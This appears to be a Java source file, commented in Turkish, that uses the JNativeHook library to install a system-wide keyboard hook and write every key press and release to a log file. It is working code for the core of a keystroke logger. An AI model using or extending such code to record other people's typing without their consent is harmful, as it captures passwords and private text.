import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

// klavye dinlemesinden sorumlu class
public class Keyboard implements NativeKeyListener {

    // klavyeye dinleyiciler atama
    public void StartListening() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.err.println("Error!");
            System.err.println(e.getMessage());
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    // klavye dinleyicilerini silme
    public void StopListening(){
        GlobalScreen.removeNativeKeyListener(this);
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
    }

    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        LogFile.appendLog("Basilan Tus " + NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));
    }


    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
        LogFile.appendLog("Birakilan Tus " + NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));
    }
}
